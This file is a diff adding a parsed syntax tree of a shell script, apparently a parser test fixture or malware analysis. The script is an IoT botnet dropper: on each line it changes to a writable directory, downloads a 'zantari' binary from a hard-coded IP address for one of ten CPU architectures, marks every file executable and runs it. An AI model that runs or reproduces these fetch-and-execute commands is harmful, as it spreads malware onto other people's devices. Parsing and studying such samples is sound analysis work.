@@ -1,0 +1,550 @@
+ListNode(lineno=2, pos=(12, 218), parts=[
+  CommandNode(lineno=2, pos=(12, 19), parts=[
+    WordNode(lineno=2, pos=(12, 14), word='cd'),
+    WordNode(lineno=2, pos=(15, 19), word='/tmp'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(20, 22)),
+  CommandNode(lineno=2, pos=(23, 34), parts=[
+    WordNode(lineno=2, pos=(23, 25), word='cd'),
+    WordNode(lineno=2, pos=(26, 34), word='/var/run'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(35, 37)),
+  CommandNode(lineno=2, pos=(38, 45), parts=[
+    WordNode(lineno=2, pos=(38, 40), word='cd'),
+    WordNode(lineno=2, pos=(41, 45), word='/mnt'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(46, 48)),
+  CommandNode(lineno=2, pos=(49, 57), parts=[
+    WordNode(lineno=2, pos=(49, 51), word='cd'),
+    WordNode(lineno=2, pos=(52, 57), word='/root'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(58, 60)),
+  CommandNode(lineno=2, pos=(61, 65), parts=[
+    WordNode(lineno=2, pos=(61, 63), word='cd'),
+    WordNode(lineno=2, pos=(64, 65), word='/'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(65, 66)),
+  CommandNode(lineno=2, pos=(67, 113), parts=[
+    WordNode(lineno=2, pos=(67, 71), word='wget'),
+    WordNode(lineno=2, pos=(72, 113), word='http://185.244.25.217/zantari/zantari.x86'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(113, 114)),
+  CommandNode(lineno=2, pos=(115, 164), parts=[
+    WordNode(lineno=2, pos=(115, 119), word='curl'),
+    WordNode(lineno=2, pos=(120, 122), word='-O'),
+    WordNode(lineno=2, pos=(123, 164), word='http://185.244.25.217/zantari/zantari.x86'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(164, 165)),
+  CommandNode(lineno=2, pos=(165, 191), parts=[
+    WordNode(lineno=2, pos=(165, 168), word='cat'),
+    WordNode(lineno=2, pos=(169, 180), word='zantari.x86'),
+    RedirectNode(lineno=2, output=
+      WordNode(lineno=2, pos=(182, 191), word='zantari32'), pos=(181, 191), type='>'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(191, 192)),
+  CommandNode(lineno=2, pos=(192, 202), parts=[
+    WordNode(lineno=2, pos=(192, 197), word='chmod'),
+    WordNode(lineno=2, pos=(198, 200), word='+x'),
+    WordNode(lineno=2, pos=(201, 202), word='*'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(202, 203)),
+  CommandNode(lineno=2, pos=(203, 218), parts=[
+    WordNode(lineno=2, pos=(203, 214), word='./zantari32'),
+    WordNode(lineno=2, pos=(215, 218), word='ssh'),
+  ]),
+])
+ListNode(lineno=3, pos=(219, 428), parts=[
+  CommandNode(lineno=3, pos=(219, 226), parts=[
+    WordNode(lineno=3, pos=(219, 221), word='cd'),
+    WordNode(lineno=3, pos=(222, 226), word='/tmp'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(227, 229)),
+  CommandNode(lineno=3, pos=(230, 241), parts=[
+    WordNode(lineno=3, pos=(230, 232), word='cd'),
+    WordNode(lineno=3, pos=(233, 241), word='/var/run'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(242, 244)),
+  CommandNode(lineno=3, pos=(245, 252), parts=[
+    WordNode(lineno=3, pos=(245, 247), word='cd'),
+    WordNode(lineno=3, pos=(248, 252), word='/mnt'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(253, 255)),
+  CommandNode(lineno=3, pos=(256, 264), parts=[
+    WordNode(lineno=3, pos=(256, 258), word='cd'),
+    WordNode(lineno=3, pos=(259, 264), word='/root'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(265, 267)),
+  CommandNode(lineno=3, pos=(268, 272), parts=[
+    WordNode(lineno=3, pos=(268, 270), word='cd'),
+    WordNode(lineno=3, pos=(271, 272), word='/'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(272, 273)),
+  CommandNode(lineno=3, pos=(274, 321), parts=[
+    WordNode(lineno=3, pos=(274, 278), word='wget'),
+    WordNode(lineno=3, pos=(279, 321), word='http://185.244.25.217/zantari/zantari.mips'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(321, 322)),
+  CommandNode(lineno=3, pos=(323, 373), parts=[
+    WordNode(lineno=3, pos=(323, 327), word='curl'),
+    WordNode(lineno=3, pos=(328, 330), word='-O'),
+    WordNode(lineno=3, pos=(331, 373), word='http://185.244.25.217/zantari/zantari.mips'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(373, 374)),
+  CommandNode(lineno=3, pos=(374, 401), parts=[
+    WordNode(lineno=3, pos=(374, 377), word='cat'),
+    WordNode(lineno=3, pos=(378, 390), word='zantari.mips'),
+    RedirectNode(lineno=3, output=
+      WordNode(lineno=3, pos=(392, 401), word='zantari32'), pos=(391, 401), type='>'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(401, 402)),
+  CommandNode(lineno=3, pos=(402, 412), parts=[
+    WordNode(lineno=3, pos=(402, 407), word='chmod'),
+    WordNode(lineno=3, pos=(408, 410), word='+x'),
+    WordNode(lineno=3, pos=(411, 412), word='*'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(412, 413)),
+  CommandNode(lineno=3, pos=(413, 428), parts=[
+    WordNode(lineno=3, pos=(413, 424), word='./zantari32'),
+    WordNode(lineno=3, pos=(425, 428), word='ssh'),
+  ]),
+])
+ListNode(lineno=4, pos=(429, 638), parts=[
+  CommandNode(lineno=4, pos=(429, 436), parts=[
+    WordNode(lineno=4, pos=(429, 431), word='cd'),
+    WordNode(lineno=4, pos=(432, 436), word='/tmp'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(437, 439)),
+  CommandNode(lineno=4, pos=(440, 451), parts=[
+    WordNode(lineno=4, pos=(440, 442), word='cd'),
+    WordNode(lineno=4, pos=(443, 451), word='/var/run'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(452, 454)),
+  CommandNode(lineno=4, pos=(455, 462), parts=[
+    WordNode(lineno=4, pos=(455, 457), word='cd'),
+    WordNode(lineno=4, pos=(458, 462), word='/mnt'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(463, 465)),
+  CommandNode(lineno=4, pos=(466, 474), parts=[
+    WordNode(lineno=4, pos=(466, 468), word='cd'),
+    WordNode(lineno=4, pos=(469, 474), word='/root'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(475, 477)),
+  CommandNode(lineno=4, pos=(478, 482), parts=[
+    WordNode(lineno=4, pos=(478, 480), word='cd'),
+    WordNode(lineno=4, pos=(481, 482), word='/'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(482, 483)),
+  CommandNode(lineno=4, pos=(484, 531), parts=[
+    WordNode(lineno=4, pos=(484, 488), word='wget'),
+    WordNode(lineno=4, pos=(489, 531), word='http://185.244.25.217/zantari/zantari.mpsl'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(531, 532)),
+  CommandNode(lineno=4, pos=(533, 583), parts=[
+    WordNode(lineno=4, pos=(533, 537), word='curl'),
+    WordNode(lineno=4, pos=(538, 540), word='-O'),
+    WordNode(lineno=4, pos=(541, 583), word='http://185.244.25.217/zantari/zantari.mpsl'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(583, 584)),
+  CommandNode(lineno=4, pos=(584, 611), parts=[
+    WordNode(lineno=4, pos=(584, 587), word='cat'),
+    WordNode(lineno=4, pos=(588, 600), word='zantari.mpsl'),
+    RedirectNode(lineno=4, output=
+      WordNode(lineno=4, pos=(602, 611), word='zantari32'), pos=(601, 611), type='>'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(611, 612)),
+  CommandNode(lineno=4, pos=(612, 622), parts=[
+    WordNode(lineno=4, pos=(612, 617), word='chmod'),
+    WordNode(lineno=4, pos=(618, 620), word='+x'),
+    WordNode(lineno=4, pos=(621, 622), word='*'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(622, 623)),
+  CommandNode(lineno=4, pos=(623, 638), parts=[
+    WordNode(lineno=4, pos=(623, 634), word='./zantari32'),
+    WordNode(lineno=4, pos=(635, 638), word='ssh'),
+  ]),
+])
+ListNode(lineno=5, pos=(639, 848), parts=[
+  CommandNode(lineno=5, pos=(639, 646), parts=[
+    WordNode(lineno=5, pos=(639, 641), word='cd'),
+    WordNode(lineno=5, pos=(642, 646), word='/tmp'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(647, 649)),
+  CommandNode(lineno=5, pos=(650, 661), parts=[
+    WordNode(lineno=5, pos=(650, 652), word='cd'),
+    WordNode(lineno=5, pos=(653, 661), word='/var/run'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(662, 664)),
+  CommandNode(lineno=5, pos=(665, 672), parts=[
+    WordNode(lineno=5, pos=(665, 667), word='cd'),
+    WordNode(lineno=5, pos=(668, 672), word='/mnt'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(673, 675)),
+  CommandNode(lineno=5, pos=(676, 684), parts=[
+    WordNode(lineno=5, pos=(676, 678), word='cd'),
+    WordNode(lineno=5, pos=(679, 684), word='/root'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(685, 687)),
+  CommandNode(lineno=5, pos=(688, 692), parts=[
+    WordNode(lineno=5, pos=(688, 690), word='cd'),
+    WordNode(lineno=5, pos=(691, 692), word='/'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(692, 693)),
+  CommandNode(lineno=5, pos=(694, 741), parts=[
+    WordNode(lineno=5, pos=(694, 698), word='wget'),
+    WordNode(lineno=5, pos=(699, 741), word='http://185.244.25.217/zantari/zantari.arm4'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(741, 742)),
+  CommandNode(lineno=5, pos=(743, 793), parts=[
+    WordNode(lineno=5, pos=(743, 747), word='curl'),
+    WordNode(lineno=5, pos=(748, 750), word='-O'),
+    WordNode(lineno=5, pos=(751, 793), word='http://185.244.25.217/zantari/zantari.arm4'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(793, 794)),
+  CommandNode(lineno=5, pos=(794, 821), parts=[
+    WordNode(lineno=5, pos=(794, 797), word='cat'),
+    WordNode(lineno=5, pos=(798, 810), word='zantari.arm4'),
+    RedirectNode(lineno=5, output=
+      WordNode(lineno=5, pos=(812, 821), word='zantari32'), pos=(811, 821), type='>'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(821, 822)),
+  CommandNode(lineno=5, pos=(822, 832), parts=[
+    WordNode(lineno=5, pos=(822, 827), word='chmod'),
+    WordNode(lineno=5, pos=(828, 830), word='+x'),
+    WordNode(lineno=5, pos=(831, 832), word='*'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(832, 833)),
+  CommandNode(lineno=5, pos=(833, 848), parts=[
+    WordNode(lineno=5, pos=(833, 844), word='./zantari32'),
+    WordNode(lineno=5, pos=(845, 848), word='ssh'),
+  ]),
+])
+ListNode(lineno=6, pos=(849, 1058), parts=[
+  CommandNode(lineno=6, pos=(849, 856), parts=[
+    WordNode(lineno=6, pos=(849, 851), word='cd'),
+    WordNode(lineno=6, pos=(852, 856), word='/tmp'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(857, 859)),
+  CommandNode(lineno=6, pos=(860, 871), parts=[
+    WordNode(lineno=6, pos=(860, 862), word='cd'),
+    WordNode(lineno=6, pos=(863, 871), word='/var/run'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(872, 874)),
+  CommandNode(lineno=6, pos=(875, 882), parts=[
+    WordNode(lineno=6, pos=(875, 877), word='cd'),
+    WordNode(lineno=6, pos=(878, 882), word='/mnt'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(883, 885)),
+  CommandNode(lineno=6, pos=(886, 894), parts=[
+    WordNode(lineno=6, pos=(886, 888), word='cd'),
+    WordNode(lineno=6, pos=(889, 894), word='/root'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(895, 897)),
+  CommandNode(lineno=6, pos=(898, 902), parts=[
+    WordNode(lineno=6, pos=(898, 900), word='cd'),
+    WordNode(lineno=6, pos=(901, 902), word='/'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(902, 903)),
+  CommandNode(lineno=6, pos=(904, 951), parts=[
+    WordNode(lineno=6, pos=(904, 908), word='wget'),
+    WordNode(lineno=6, pos=(909, 951), word='http://185.244.25.217/zantari/zantari.arm5'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(951, 952)),
+  CommandNode(lineno=6, pos=(953, 1003), parts=[
+    WordNode(lineno=6, pos=(953, 957), word='curl'),
+    WordNode(lineno=6, pos=(958, 960), word='-O'),
+    WordNode(lineno=6, pos=(961, 1003), word='http://185.244.25.217/zantari/zantari.arm5'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(1003, 1004)),
+  CommandNode(lineno=6, pos=(1004, 1031), parts=[
+    WordNode(lineno=6, pos=(1004, 1007), word='cat'),
+    WordNode(lineno=6, pos=(1008, 1020), word='zantari.arm5'),
+    RedirectNode(lineno=6, output=
+      WordNode(lineno=6, pos=(1022, 1031), word='zantari32'), pos=(1021, 1031), type='>'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(1031, 1032)),
+  CommandNode(lineno=6, pos=(1032, 1042), parts=[
+    WordNode(lineno=6, pos=(1032, 1037), word='chmod'),
+    WordNode(lineno=6, pos=(1038, 1040), word='+x'),
+    WordNode(lineno=6, pos=(1041, 1042), word='*'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(1042, 1043)),
+  CommandNode(lineno=6, pos=(1043, 1058), parts=[
+    WordNode(lineno=6, pos=(1043, 1054), word='./zantari32'),
+    WordNode(lineno=6, pos=(1055, 1058), word='ssh'),
+  ]),
+])
+ListNode(lineno=7, pos=(1059, 1268), parts=[
+  CommandNode(lineno=7, pos=(1059, 1066), parts=[
+    WordNode(lineno=7, pos=(1059, 1061), word='cd'),
+    WordNode(lineno=7, pos=(1062, 1066), word='/tmp'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(1067, 1069)),
+  CommandNode(lineno=7, pos=(1070, 1081), parts=[
+    WordNode(lineno=7, pos=(1070, 1072), word='cd'),
+    WordNode(lineno=7, pos=(1073, 1081), word='/var/run'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(1082, 1084)),
+  CommandNode(lineno=7, pos=(1085, 1092), parts=[
+    WordNode(lineno=7, pos=(1085, 1087), word='cd'),
+    WordNode(lineno=7, pos=(1088, 1092), word='/mnt'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(1093, 1095)),
+  CommandNode(lineno=7, pos=(1096, 1104), parts=[
+    WordNode(lineno=7, pos=(1096, 1098), word='cd'),
+    WordNode(lineno=7, pos=(1099, 1104), word='/root'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(1105, 1107)),
+  CommandNode(lineno=7, pos=(1108, 1112), parts=[
+    WordNode(lineno=7, pos=(1108, 1110), word='cd'),
+    WordNode(lineno=7, pos=(1111, 1112), word='/'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1112, 1113)),
+  CommandNode(lineno=7, pos=(1114, 1161), parts=[
+    WordNode(lineno=7, pos=(1114, 1118), word='wget'),
+    WordNode(lineno=7, pos=(1119, 1161), word='http://185.244.25.217/zantari/zantari.arm6'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1161, 1162)),
+  CommandNode(lineno=7, pos=(1163, 1213), parts=[
+    WordNode(lineno=7, pos=(1163, 1167), word='curl'),
+    WordNode(lineno=7, pos=(1168, 1170), word='-O'),
+    WordNode(lineno=7, pos=(1171, 1213), word='http://185.244.25.217/zantari/zantari.arm6'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1213, 1214)),
+  CommandNode(lineno=7, pos=(1214, 1241), parts=[
+    WordNode(lineno=7, pos=(1214, 1217), word='cat'),
+    WordNode(lineno=7, pos=(1218, 1230), word='zantari.arm6'),
+    RedirectNode(lineno=7, output=
+      WordNode(lineno=7, pos=(1232, 1241), word='zantari32'), pos=(1231, 1241), type='>'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1241, 1242)),
+  CommandNode(lineno=7, pos=(1242, 1252), parts=[
+    WordNode(lineno=7, pos=(1242, 1247), word='chmod'),
+    WordNode(lineno=7, pos=(1248, 1250), word='+x'),
+    WordNode(lineno=7, pos=(1251, 1252), word='*'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1252, 1253)),
+  CommandNode(lineno=7, pos=(1253, 1268), parts=[
+    WordNode(lineno=7, pos=(1253, 1264), word='./zantari32'),
+    WordNode(lineno=7, pos=(1265, 1268), word='ssh'),
+  ]),
+])
+ListNode(lineno=8, pos=(1269, 1478), parts=[
+  CommandNode(lineno=8, pos=(1269, 1276), parts=[
+    WordNode(lineno=8, pos=(1269, 1271), word='cd'),
+    WordNode(lineno=8, pos=(1272, 1276), word='/tmp'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1277, 1279)),
+  CommandNode(lineno=8, pos=(1280, 1291), parts=[
+    WordNode(lineno=8, pos=(1280, 1282), word='cd'),
+    WordNode(lineno=8, pos=(1283, 1291), word='/var/run'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1292, 1294)),
+  CommandNode(lineno=8, pos=(1295, 1302), parts=[
+    WordNode(lineno=8, pos=(1295, 1297), word='cd'),
+    WordNode(lineno=8, pos=(1298, 1302), word='/mnt'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1303, 1305)),
+  CommandNode(lineno=8, pos=(1306, 1314), parts=[
+    WordNode(lineno=8, pos=(1306, 1308), word='cd'),
+    WordNode(lineno=8, pos=(1309, 1314), word='/root'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1315, 1317)),
+  CommandNode(lineno=8, pos=(1318, 1322), parts=[
+    WordNode(lineno=8, pos=(1318, 1320), word='cd'),
+    WordNode(lineno=8, pos=(1321, 1322), word='/'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1322, 1323)),
+  CommandNode(lineno=8, pos=(1324, 1371), parts=[
+    WordNode(lineno=8, pos=(1324, 1328), word='wget'),
+    WordNode(lineno=8, pos=(1329, 1371), word='http://185.244.25.217/zantari/zantari.arm7'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1371, 1372)),
+  CommandNode(lineno=8, pos=(1373, 1423), parts=[
+    WordNode(lineno=8, pos=(1373, 1377), word='curl'),
+    WordNode(lineno=8, pos=(1378, 1380), word='-O'),
+    WordNode(lineno=8, pos=(1381, 1423), word='http://185.244.25.217/zantari/zantari.arm7'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1423, 1424)),
+  CommandNode(lineno=8, pos=(1424, 1451), parts=[
+    WordNode(lineno=8, pos=(1424, 1427), word='cat'),
+    WordNode(lineno=8, pos=(1428, 1440), word='zantari.arm7'),
+    RedirectNode(lineno=8, output=
+      WordNode(lineno=8, pos=(1442, 1451), word='zantari32'), pos=(1441, 1451), type='>'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1451, 1452)),
+  CommandNode(lineno=8, pos=(1452, 1462), parts=[
+    WordNode(lineno=8, pos=(1452, 1457), word='chmod'),
+    WordNode(lineno=8, pos=(1458, 1460), word='+x'),
+    WordNode(lineno=8, pos=(1461, 1462), word='*'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1462, 1463)),
+  CommandNode(lineno=8, pos=(1463, 1478), parts=[
+    WordNode(lineno=8, pos=(1463, 1474), word='./zantari32'),
+    WordNode(lineno=8, pos=(1475, 1478), word='ssh'),
+  ]),
+])
+ListNode(lineno=9, pos=(1479, 1685), parts=[
+  CommandNode(lineno=9, pos=(1479, 1486), parts=[
+    WordNode(lineno=9, pos=(1479, 1481), word='cd'),
+    WordNode(lineno=9, pos=(1482, 1486), word='/tmp'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1487, 1489)),
+  CommandNode(lineno=9, pos=(1490, 1501), parts=[
+    WordNode(lineno=9, pos=(1490, 1492), word='cd'),
+    WordNode(lineno=9, pos=(1493, 1501), word='/var/run'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1502, 1504)),
+  CommandNode(lineno=9, pos=(1505, 1512), parts=[
+    WordNode(lineno=9, pos=(1505, 1507), word='cd'),
+    WordNode(lineno=9, pos=(1508, 1512), word='/mnt'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1513, 1515)),
+  CommandNode(lineno=9, pos=(1516, 1524), parts=[
+    WordNode(lineno=9, pos=(1516, 1518), word='cd'),
+    WordNode(lineno=9, pos=(1519, 1524), word='/root'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1525, 1527)),
+  CommandNode(lineno=9, pos=(1528, 1532), parts=[
+    WordNode(lineno=9, pos=(1528, 1530), word='cd'),
+    WordNode(lineno=9, pos=(1531, 1532), word='/'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1532, 1533)),
+  CommandNode(lineno=9, pos=(1534, 1580), parts=[
+    WordNode(lineno=9, pos=(1534, 1538), word='wget'),
+    WordNode(lineno=9, pos=(1539, 1580), word='http://185.244.25.217/zantari/zantari.ppc'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1580, 1581)),
+  CommandNode(lineno=9, pos=(1582, 1631), parts=[
+    WordNode(lineno=9, pos=(1582, 1586), word='curl'),
+    WordNode(lineno=9, pos=(1587, 1589), word='-O'),
+    WordNode(lineno=9, pos=(1590, 1631), word='http://185.244.25.217/zantari/zantari.ppc'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1631, 1632)),
+  CommandNode(lineno=9, pos=(1632, 1658), parts=[
+    WordNode(lineno=9, pos=(1632, 1635), word='cat'),
+    WordNode(lineno=9, pos=(1636, 1647), word='zantari.ppc'),
+    RedirectNode(lineno=9, output=
+      WordNode(lineno=9, pos=(1649, 1658), word='zantari32'), pos=(1648, 1658), type='>'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1658, 1659)),
+  CommandNode(lineno=9, pos=(1659, 1669), parts=[
+    WordNode(lineno=9, pos=(1659, 1664), word='chmod'),
+    WordNode(lineno=9, pos=(1665, 1667), word='+x'),
+    WordNode(lineno=9, pos=(1668, 1669), word='*'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1669, 1670)),
+  CommandNode(lineno=9, pos=(1670, 1685), parts=[
+    WordNode(lineno=9, pos=(1670, 1681), word='./zantari32'),
+    WordNode(lineno=9, pos=(1682, 1685), word='ssh'),
+  ]),
+])
+ListNode(lineno=10, pos=(1686, 1895), parts=[
+  CommandNode(lineno=10, pos=(1686, 1693), parts=[
+    WordNode(lineno=10, pos=(1686, 1688), word='cd'),
+    WordNode(lineno=10, pos=(1689, 1693), word='/tmp'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1694, 1696)),
+  CommandNode(lineno=10, pos=(1697, 1708), parts=[
+    WordNode(lineno=10, pos=(1697, 1699), word='cd'),
+    WordNode(lineno=10, pos=(1700, 1708), word='/var/run'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1709, 1711)),
+  CommandNode(lineno=10, pos=(1712, 1719), parts=[
+    WordNode(lineno=10, pos=(1712, 1714), word='cd'),
+    WordNode(lineno=10, pos=(1715, 1719), word='/mnt'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1720, 1722)),
+  CommandNode(lineno=10, pos=(1723, 1731), parts=[
+    WordNode(lineno=10, pos=(1723, 1725), word='cd'),
+    WordNode(lineno=10, pos=(1726, 1731), word='/root'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1732, 1734)),
+  CommandNode(lineno=10, pos=(1735, 1739), parts=[
+    WordNode(lineno=10, pos=(1735, 1737), word='cd'),
+    WordNode(lineno=10, pos=(1738, 1739), word='/'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1739, 1740)),
+  CommandNode(lineno=10, pos=(1741, 1788), parts=[
+    WordNode(lineno=10, pos=(1741, 1745), word='wget'),
+    WordNode(lineno=10, pos=(1746, 1788), word='http://185.244.25.217/zantari/zantari.m68k'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1788, 1789)),
+  CommandNode(lineno=10, pos=(1790, 1840), parts=[
+    WordNode(lineno=10, pos=(1790, 1794), word='curl'),
+    WordNode(lineno=10, pos=(1795, 1797), word='-O'),
+    WordNode(lineno=10, pos=(1798, 1840), word='http://185.244.25.217/zantari/zantari.m68k'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1840, 1841)),
+  CommandNode(lineno=10, pos=(1841, 1868), parts=[
+    WordNode(lineno=10, pos=(1841, 1844), word='cat'),
+    WordNode(lineno=10, pos=(1845, 1857), word='zantari.m68k'),
+    RedirectNode(lineno=10, output=
+      WordNode(lineno=10, pos=(1859, 1868), word='zantari32'), pos=(1858, 1868), type='>'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1868, 1869)),
+  CommandNode(lineno=10, pos=(1869, 1879), parts=[
+    WordNode(lineno=10, pos=(1869, 1874), word='chmod'),
+    WordNode(lineno=10, pos=(1875, 1877), word='+x'),
+    WordNode(lineno=10, pos=(1878, 1879), word='*'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1879, 1880)),
+  CommandNode(lineno=10, pos=(1880, 1895), parts=[
+    WordNode(lineno=10, pos=(1880, 1891), word='./zantari32'),
+    WordNode(lineno=10, pos=(1892, 1895), word='ssh'),
+  ]),
+])
+ListNode(lineno=11, pos=(1896, 2102), parts=[
+  CommandNode(lineno=11, pos=(1896, 1903), parts=[
+    WordNode(lineno=11, pos=(1896, 1898), word='cd'),
+    WordNode(lineno=11, pos=(1899, 1903), word='/tmp'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1904, 1906)),
+  CommandNode(lineno=11, pos=(1907, 1918), parts=[
+    WordNode(lineno=11, pos=(1907, 1909), word='cd'),
+    WordNode(lineno=11, pos=(1910, 1918), word='/var/run'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1919, 1921)),
+  CommandNode(lineno=11, pos=(1922, 1929), parts=[
+    WordNode(lineno=11, pos=(1922, 1924), word='cd'),
+    WordNode(lineno=11, pos=(1925, 1929), word='/mnt'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1930, 1932)),
+  CommandNode(lineno=11, pos=(1933, 1941), parts=[
+    WordNode(lineno=11, pos=(1933, 1935), word='cd'),
+    WordNode(lineno=11, pos=(1936, 1941), word='/root'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1942, 1944)),
+  CommandNode(lineno=11, pos=(1945, 1949), parts=[
+    WordNode(lineno=11, pos=(1945, 1947), word='cd'),
+    WordNode(lineno=11, pos=(1948, 1949), word='/'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1949, 1950)),
+  CommandNode(lineno=11, pos=(1951, 1997), parts=[
+    WordNode(lineno=11, pos=(1951, 1955), word='wget'),
+    WordNode(lineno=11, pos=(1956, 1997), word='http://185.244.25.217/zantari/zantari.sh4'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1997, 1998)),
+  CommandNode(lineno=11, pos=(1999, 2048), parts=[
+    WordNode(lineno=11, pos=(1999, 2003), word='curl'),
+    WordNode(lineno=11, pos=(2004, 2006), word='-O'),
+    WordNode(lineno=11, pos=(2007, 2048), word='http://185.244.25.217/zantari/zantari.sh4'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(2048, 2049)),
+  CommandNode(lineno=11, pos=(2049, 2075), parts=[
+    WordNode(lineno=11, pos=(2049, 2052), word='cat'),
+    WordNode(lineno=11, pos=(2053, 2064), word='zantari.sh4'),
+    RedirectNode(lineno=11, output=
+      WordNode(lineno=11, pos=(2066, 2075), word='zantari32'), pos=(2065, 2075), type='>'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(2075, 2076)),
+  CommandNode(lineno=11, pos=(2076, 2086), parts=[
+    WordNode(lineno=11, pos=(2076, 2081), word='chmod'),
+    WordNode(lineno=11, pos=(2082, 2084), word='+x'),
+    WordNode(lineno=11, pos=(2085, 2086), word='*'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(2086, 2087)),
+  CommandNode(lineno=11, pos=(2087, 2102), parts=[
+    WordNode(lineno=11, pos=(2087, 2098), word='./zantari32'),
+    WordNode(lineno=11, pos=(2099, 2102), word='ssh'),
+  ]),
+])
